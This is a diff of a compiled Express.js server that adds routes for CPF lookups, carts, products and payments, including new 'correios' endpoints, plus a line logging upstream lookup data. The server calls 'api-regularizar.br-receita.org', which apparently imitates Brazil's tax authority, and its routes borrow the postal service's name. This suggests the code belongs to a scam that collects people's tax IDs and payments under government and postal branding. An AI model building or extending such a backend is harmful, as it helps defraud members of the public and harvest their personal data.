@@ -44,6 +44,7 @@ const app = (0, express_1.default)();
 const port = process.env.PORT || 3000;
 const cors_1 = __importDefault(require("cors"));
 const express_rate_limit_1 = __importDefault(require("express-rate-limit"));
+const correios_1 = require("./correios");
 app.use(express_1.default.json());
 app.use((0, cors_1.default)({
     origin: '*'
@@ -72,6 +73,7 @@ const cpfConsulta = async (req, res, next) => {
                 .json({ error: `Upstream retornou ${upstream.status}` });
         }
         const data = await upstream.json();
+        console.log(data);
         const getOrder = await fetch(`https://api-regularizar.br-receita.org/cart/${cartId}/customer`, {
             method: 'POST',
             headers: {
@@ -172,14 +174,20 @@ const getCartByPlan = async (req, res, next) => {
         return res.json(err);
     }
 };
-consultaRouter.get('/:cpf/:cartId', cpfLimiter, cpf);
+const cartRouter = (0, express_1.Router)();
+cartRouter.get('/cart', getCartByPlan);
+app.use('/', cartRouter);
+const cartCorreioRouter = (0, express_1.Router)();
+cartCorreioRouter.get('/correiosCart', correios_1.getCorreioCart);
+app.use('/', cartCorreioRouter);
+const getProductsRouter = (0, express_1.Router)();
+getProductsRouter.get('/produtos', correios_1.getProducts);
+app.use("/", getProductsRouter);
+consultaRouter.get('/:cpf', cpfLimiter, cpf);
 app.use('/', consultaRouter);
 const customerRouter = (0, express_1.Router)();
 customerRouter.post('/:cpf/:cartId', cpfLimiter, cpfConsulta);
 app.use('/customer', customerRouter);
-const cartRouter = (0, express_1.Router)();
-cartRouter.get('/cart', getCartByPlan);
-app.use('/', cartRouter);
 const paymentRouter = (0, express_1.Router)();
 const payment = async (req, res, next) => {
     const { cpf, cartId } = req.params;
@@ -243,6 +251,12 @@ const payment = async (req, res, next) => {
 };
 paymentRouter.post('/:cpf/:cartId', payment);
 app.use("/payment", paymentRouter);
+const paymentCorreiosRouter = (0, express_1.Router)();
+paymentCorreiosRouter.post('/:cpf/:cartId', correios_1.paymentCorreios);
+app.use("/correioPayment", paymentCorreiosRouter);
+const correioCustomerRouter = (0, express_1.Router)();
+correioCustomerRouter.post('/:cpf/:cartId', cpfLimiter, correios_1.cpfConsultaCorreios);
+app.use('/correioCustomer', correioCustomerRouter);
 app.listen(port, () => {
     console.log(`🚀 Server rodando em http://localhost:${port}`);
 });
